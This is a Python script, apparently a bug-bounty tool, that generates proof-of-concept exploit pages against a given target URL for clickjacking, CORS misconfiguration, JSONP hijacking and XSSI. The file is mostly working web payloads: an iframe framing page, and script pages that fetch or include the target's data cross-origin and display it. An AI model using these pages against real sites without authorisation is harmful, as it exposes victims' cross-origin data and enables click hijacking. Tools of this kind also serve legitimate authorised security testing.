#!/usr/bin/env python
from urllib.parse import urlparse
import os
import argparse


def main():
    if exploit == "clickjacking":
        template = """<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width" />
    <title>Clickjacking PoC</title>
  </head>
  <body>
    <iframe src="{}" width="100%" height="615px"></iframe>
  </body>
</html>""".format(url)
        
    elif exploit == "cors":
        template = """<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width" />
    <title>CORS Exploit</title>
</head>

<body>
    <center>
        <button type='button' onclick='exploit()'>Exploit</button>
        <p id='demo'></p>
    </center>

    <script>
        function handleResponse() {{
      document.write(this.responseText);
    }}

    function exploit() {{
      var request = new XMLHttpRequest();
      request.addEventListener("load", handleResponse);
      request.open("{}", "{}");
      request.send();
    }}
    </script>

</body>

</html>""".format(method, url)

    elif exploit == "jsonp":
        template = """<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width" />
    <title>JSONP Hijacking</title>
  </head>
  <body>
      <script charset="utf-8">
        function exploit(data){{
          alert(JSON.stringify(data));
        }}
      </script>
      <script src="{}&callback=exploit">
      </script>
  </body>
</html>""".format(url)

    elif exploit == "xssi":
        template = """<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width" />
    <title>XSSI Exploit</title>
  </head>
  <body>
    <script charset="utf-8" src="{}">
    </script>

    <script charset="utf-8">
      var info = {};
      alert(info);
    </script>
  </body>
</html>""".format(url, variable)



    domain = urlparse(url).netloc
    path = urlparse(url).path.replace("/", "-")
    fileName = domain + "-" + exploit + path + ".html"
    file = open(fileName, "w+")
    file.write(template)
    file.close()
    print("Your exploit saved as \033[36m" + fileName + "\033[0m\nYou can open it in your browser via \033[36mfile://" + os.path.realpath(fileName) + "\033[0m")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Exploit Generator for Bug Hunters")
    parser.add_argument('-e', '--exploit', help="Vulnerability type you want to exploit", required=True, choices=["clickjacking", "cors", "xssi", "jsonp"])
    parser.add_argument('-u', '--url', help="Target URL", required=True)
    parser.add_argument('-m', '--method', help="HTTP method of request", default="GET")
    parser.add_argument('-v', '--variable', help="Variable to use in XSSI")
    
    args = parser.parse_args()
    exploit = args.exploit
    url = args.url
    method = args.method
    variable = args.variable
    main()